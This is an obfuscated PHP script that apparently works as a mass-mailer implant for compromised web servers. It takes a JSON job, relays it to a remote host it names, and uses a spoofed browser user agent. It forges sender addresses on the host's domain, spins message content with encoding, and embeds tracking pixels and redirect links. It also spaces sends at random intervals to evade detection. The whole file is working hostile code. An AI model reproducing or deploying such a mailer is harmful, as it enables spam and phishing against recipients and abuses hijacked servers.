<?php
@ini_set('max_execution_time', '3600'); @ini_set('max_input_time', '3600'); @set_time_limit(3600); @date_default_timezone_set('UTC'); class Macros { private $values = array(); private $fixed = array(); private $used = array(); private $_keys = array(); public function __get($spc1fbba) { if ($spc1fbba == 'keys') { return array_keys($this->_keys); } } public function Import($spc1fbba, $sp481d12) { if (is_array($sp481d12)) { $this->values[$spc1fbba] = array(); foreach ($sp481d12 as $sp9cc2c0) { if (!empty($sp9cc2c0['key'])) { $this->values[$spc1fbba][$sp9cc2c0['key']] = $sp9cc2c0['value']; } else { $this->values[$spc1fbba][] = $sp9cc2c0['value']; } } } else { $this->Assign($spc1fbba, $sp481d12); } } public function Assign($spc1fbba, $spf3aa52) { $this->values[$spc1fbba] = $spf3aa52; } public function Parse($sp0f3215) { $sp4ce41e = ''; $spa30973 = 0; while (true) { $sp5506bc = strpos($sp0f3215, '{', $spa30973); if ($sp5506bc === false) { $sp4ce41e .= substr($sp0f3215, $spa30973); break; } $sp4ce41e .= substr($sp0f3215, $spa30973, $sp5506bc - $spa30973); $spa30973 = $sp5506bc + 1; $sp23b90f = ''; $sp5e8c95 = '{'; $sp4c90cf = array(); $spe6577b = false; $sp49d3c7 = false; $spad5b36 = 'var'; while ($spa30973 < strlen($sp0f3215)) { $sp7dd457 = substr($sp0f3215, $spa30973, 1); $sp5e8c95 .= $sp7dd457; if ($sp7dd457 == ',' || $sp7dd457 == '>' || $sp7dd457 == '|') { if ($spad5b36 == 'alias') { $spe6577b = $sp23b90f; } elseif ($spad5b36 == 'mod') { $sp49d3c7 = $sp23b90f; } else { $sp4c90cf[] = $sp23b90f; } $sp23b90f = ''; if ($sp7dd457 == '>') { $spad5b36 = 'alias'; } if ($sp7dd457 == '|') { $spad5b36 = 'mod'; } $spa30973++; continue; } if ($sp7dd457 == '}') { if ($spad5b36 == 'alias') { $spe6577b = $sp23b90f; } elseif ($spad5b36 == 'mod') { $sp49d3c7 = $sp23b90f; } else { $sp4c90cf[] = $sp23b90f; } $spa30973++; break; } $sp23b90f .= $sp7dd457; if (preg_match('/[0-9A-Za-z_\\[\\]\\-\\^!]/', $sp7dd457) == 0) { $spa30973++; $sp4c90cf = array(); break; } $spa30973++; } if (sizeof($sp4c90cf) == 0) { $sp4ce41e .= $sp5e8c95; continue; } $sp058148 = false; $sp3f9150 = false; if (preg_match('/^\\^/', $sp4c90cf[0]) > 0) { $sp4c90cf[0] = substr($sp4c90cf[0], 1); $sp058148 = true; } if (preg_match('/^\\!/', $sp4c90cf[0]) > 0) { $sp4c90cf[0] = substr($sp4c90cf[0], 1); $sp3f9150 = true; } $sp8e6c53 = false; if (preg_match('/\\[([0-9A-Za-z_]+)\\]/', $sp4c90cf[0], $sp64b949) > 0) { $sp8e6c53 = $sp64b949[1]; } elseif (preg_match('/\\[([\\d\\-]+)\\]/', $sp4c90cf[0], $sp64b949) > 0) { $sp8e6c53 = explode('-', $sp64b949[1]); } if ($sp8e6c53 !== false) { $sp4c90cf[0] = substr($sp4c90cf[0], 0, strpos($sp4c90cf[0], '[')); } $this->_keys[$sp4c90cf[0]] = true; if (empty($this->values[$sp4c90cf[0]]) && empty($this->fixed[$sp4c90cf[0]])) { continue; } if ($sp058148) { unset($this->fixed[$sp4c90cf[0]]); } if (isset($this->fixed[$sp4c90cf[0]])) { $spdbcf81 = $this->fixed[$sp4c90cf[0]]; } else { $spdbcf81 = ''; $spd0ab76 = 1; if (sizeof($sp4c90cf) == 2) { $spd0ab76 = $sp4c90cf[1]; } if (sizeof($sp4c90cf) == 3) { $spd0ab76 = rand($sp4c90cf[1], $sp4c90cf[2]); } for ($sp5fa636 = 0; $sp5fa636 < $spd0ab76; $sp5fa636++) { if (is_array($this->values[$sp4c90cf[0]])) { if (!is_array($this->used[$sp4c90cf[0]])) { $this->used[$sp4c90cf[0]] = array(); } if (count($this->used[$sp4c90cf[0]]) == count($this->values[$sp4c90cf[0]])) { $this->used[$sp4c90cf[0]] = array(); } if ($sp8e6c53 !== false && is_scalar($sp8e6c53)) { $spdbcf81 .= $this->values[$sp4c90cf[0]][$sp8e6c53]; $this->used[$sp8e6c53] = true; } else { $spf9ff21 = array(); if (is_array($sp8e6c53)) { $spcca9b4 = $sp8e6c53[0]; $spd31118 = $sp8e6c53[1]; } else { $spcca9b4 = 0; $spd31118 = count($this->values[$sp4c90cf[0]]) - 1; } for ($spe48750 = $spcca9b4; $spe48750 <= $spd31118; $spe48750++) { if ($sp3f9150 && !empty($this->used[$sp4c90cf[0]][$spe48750])) { continue; } $spf9ff21[] = $spe48750; } $sp62d476 = $spf9ff21[rand(0, count($spf9ff21) - 1)]; $this->used[$sp4c90cf[0]][$sp62d476] = true; $spdbcf81 .= $this->values[$sp4c90cf[0]][$sp62d476]; } } else { $spdbcf81 .= $this->values[$sp4c90cf[0]]; } } } $spdbcf81 = $this->Parse($spdbcf81); if ($sp49d3c7 !== false) { for ($spf147ad = 0; $spf147ad < strlen($sp49d3c7); $spf147ad++) { switch (substr($sp49d3c7, $spf147ad, 1)) { case 'b': $spdbcf81 = base64_encode($spdbcf81); break; case 'q': $spdbcf81 = quoted_printable_encode($spdbcf81); break; default: break; } } } if ($sp058148) { $this->fixed[$sp4c90cf[0]] = $spdbcf81; } if ($spe6577b !== false && $spe6577b != '') { $this->fixed[$spe6577b] = $spdbcf81; } $sp4ce41e .= $spdbcf81; } return $sp4ce41e; } } $sp26ee08 = file_get_contents('php://input'); $spd882d2 = json_decode($sp26ee08, true); if (empty($spd882d2['via_proxy'])) { $spd882d2['via_proxy'] = true; $spd8eb6a = curl_init($spd882d2['prefix'] . $spd882d2['files']['s']); $sp87de69 = json_encode($spd882d2); curl_setopt($spd8eb6a, CURLOPT_CONNECTTIMEOUT, 30); curl_setopt($spd8eb6a, CURLOPT_TIMEOUT, 600); curl_setopt($spd8eb6a, CURLOPT_RETURNTRANSFER, true); curl_setopt($spd8eb6a, CURLOPT_USERAGENT, 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'); curl_setopt($spd8eb6a, CURLOPT_REFERER, $sp447d33); curl_setopt($spd8eb6a, CURLOPT_POST, true); curl_setopt($spd8eb6a, CURLOPT_POSTFIELDS, $sp87de69); curl_setopt($spd8eb6a, CURLOPT_HTTPHEADER, array('Content-Type: application/json', 'Content-Length: ' . strlen($sp87de69))); $sp293736 = curl_exec($spd8eb6a); echo $sp293736; die; } $spb35c00 = $_SERVER['SERVER_ADDR']; $sp5ecd61 = $_SERVER['HTTP_HOST']; $sp5ecd61 = preg_replace('/^www\\./', '', $sp5ecd61); $sp2d7e05 = new Macros(); $sp2d7e05->Assign('server_addr', $spb35c00); $sp2d7e05->Assign('server_host', $sp5ecd61); foreach ($spd882d2['macros'] as $spc1fbba => $sp481d12) { $sp2d7e05->Import($spc1fbba, $sp481d12); } $sp537ce6 = preg_replace('/^www\\./i', '', $sp5ecd61); $sp88a06d = $sp2d7e05->Parse('{from_user}@' . $sp537ce6); $sp2d7e05->Assign('from_email', $sp88a06d); $sp2d7e05->Assign('prefix', $spd882d2['prefix']); $sp2d7e05->Assign('html', $spd882d2['letter']['html']); $spa30973 = 0; $sp940042 = 0; $sp647efb = 0; $spf77ce2 = array(); foreach ($spd882d2['rcpt'] as $spcb285c) { $sp2d7e05->Assign('email', $spcb285c['email']); $sp2d7e05->Assign('entry', $spcb285c); $sp2d7e05->Assign('date', date('r')); $sp2d7e05->Assign('redirect', $spd882d2['prefix'] . $spd882d2['files']['r']); $sp2d7e05->Assign('redirect_with_uri', $spd882d2['prefix'] . $spd882d2['files']['r'] . '?uri='); $sp2d7e05->Assign('unsubscribe', $spd882d2['prefix'] . $spd882d2['files']['u'] . '?id=' . $spcb285c['id']); $sp2d7e05->Assign('delivery', '<img src="' . $spd882d2['prefix'] . $spd882d2['files']['d'] . '?id=' . $spcb285c['id'] . '" />'); $sp61015a = $sp2d7e05->Parse($spd882d2['envelope']['header']); $sp1ea096 = $sp2d7e05->Parse($spd882d2['envelope']['body']); if (!empty($spcb285c['name'])) { $sp2595e7 = $spcb285c['name'] . ' <' . $spcb285c['email'] . '>'; } else { $sp2595e7 = $spcb285c['email']; } $sp64fb57 = $sp2d7e05->Parse($spd882d2['letter']['subject']); if ($spa30973 > 0) { sleep(rand(3, 8)); } $spd9790f = mail($sp2595e7, $sp64fb57, $sp1ea096, $sp61015a); $spf77ce2[$spcb285c['id']] = $spd9790f; if ($spd9790f) { $sp940042++; } else { $sp647efb++; } $spa30973++; } echo serialize(array('total' => count($spd882d2['rcpt']), 'sent' => $spa30973, 'success' => $sp940042, 'error' => $sp647efb, 'rcpt' => $spf77ce2));